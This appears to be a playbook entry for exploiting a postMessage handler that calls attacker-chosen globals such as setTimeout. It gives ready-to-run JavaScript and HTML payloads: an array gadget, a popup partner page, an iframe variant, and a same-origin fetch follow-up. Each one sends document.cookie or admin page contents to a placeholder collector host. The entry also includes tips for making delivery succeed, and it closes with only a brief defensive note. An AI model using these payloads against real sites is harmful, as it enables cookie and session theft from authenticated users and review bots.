# postMessage setTimeout Array Gadget Payload

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a widget handles `postMessage` with dynamic global dispatch such as `window[event.data.func](event.data)`
- the handler gates on something like `event.data.action === 'log'`
- there is no strict `event.origin` allowlist
- a review/admin bot opens attacker-controlled partner URLs in an authenticated session

## Minimal Payload

Use an array so the code string survives structured clone and stringifies correctly:

```javascript
const code = '(new Image).src="https://[collector]/?c="+encodeURIComponent(document.cookie)';
const p = [code];
p.action = 'log';
p.func = 'setTimeout';

popup.postMessage(p, '*');
```

## Popup Partner Page Example

Prefer a popup over an iframe when the secret lives in first-party cookies:

```html
<!doctype html>
<meta charset=utf-8>
<body>
<script>
const TARGET = 'https://[provider]/embed/handoff';
const COLLECTOR = 'https://[collector]';
const w = window.open(TARGET, 'pw');

setTimeout(() => {
  const code = '(new Image).src="' + COLLECTOR + '/?c="+encodeURIComponent(document.cookie)';
  const p = [code];
  p.action = 'log';
  p.func = 'setTimeout';
  w.postMessage(p, '*');
}, 2000);
</script>
```

## Iframe Variant

Use only for behavior confirmation. Cookie theft may still fail because of third-party cookie restrictions:

```html
<script>
const frame = document.createElement('iframe');
frame.src = 'https://[provider]/embed/handoff';
document.body.appendChild(frame);

setTimeout(() => {
  const p = ['document.title="pwned"'];
  p.action = 'log';
  p.func = 'setTimeout';
  frame.contentWindow.postMessage(p, '*');
}, 1500);
</script>
```

## Same-Origin Follow-up

If the flag is HttpOnly, exfil cookies may be empty. From the XSS context, try same-origin reads:

```javascript
const code = [
  'fetch("/panel",{credentials:"include"})',
  '.then(r=>r.text())',
  '.then(t=>{(new Image).src="https://[collector]/?p="+encodeURIComponent(t.slice(0,300))})'
].join('');
```

## Why It Works

The receiver executes attacker-selected globals. `setTimeout` coerces the array payload to a string and runs it as legacy timer code. Arrays keep `action` and `func` through structured clone, while function properties such as custom `toString` do not.

## Why It Fails

- `func: 'eval'` with indirect `window['eval'](payload)`
- payloads that rely on custom `toString`
- `new String(code)` with attached metadata properties
- iframe-only delivery when the secret is in first-party cookies blocked in embedded context
- strict `event.origin` validation or fixed method dispatch

## Common Mistakes

- Putting the exploit script in `<head>` before `<body>` exists, so the iframe never mounts
- Testing only `eval` because the payload visually looks like JavaScript code
- Using `fetch` for exfil without checking CORS/CSP and missing the callback entirely
- Assuming one failed delivery mode means the gadget does not exist

## Defensive Note

Never implement `window[event.data.func](event.data)`. If logging bridges are required in non-production builds, gate them behind origin checks and fixed method names.
